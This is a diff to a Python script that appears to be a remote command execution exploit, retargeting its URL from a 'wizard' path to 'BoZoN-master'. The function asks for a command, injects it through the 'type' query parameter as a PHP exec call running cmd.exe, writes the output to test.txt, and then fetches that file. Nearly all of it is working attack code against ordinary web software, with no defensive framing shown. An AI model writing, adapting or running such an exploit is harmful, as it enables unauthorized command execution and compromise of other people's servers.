@@ -44,13 +44,13 @@ def execute_remote_command(args):
     cmd = input("Enter the command to execute: ")
     port = args.port
 
-    url = f"http://{args.IP}:{port}/wizard/?type='"
+    url = f"http://{args.IP}:{port}/BoZoN-master/?type='"
     url += f';echo exec("c:\\Windows\\system32\\cmd.exe /c {cmd} >test.txt");'
     url += "'';';"
     try:
         response = requests.get(url)
         response.raise_for_status()
-        url = f"http://{args.IP}:{port}/wizard/test.txt"
+        url = f"http://{args.IP}:{port}/BoZoN-master/test.txt"
         response = requests.get(url)
         print(response.text)
     except requests.HTTPError as err:
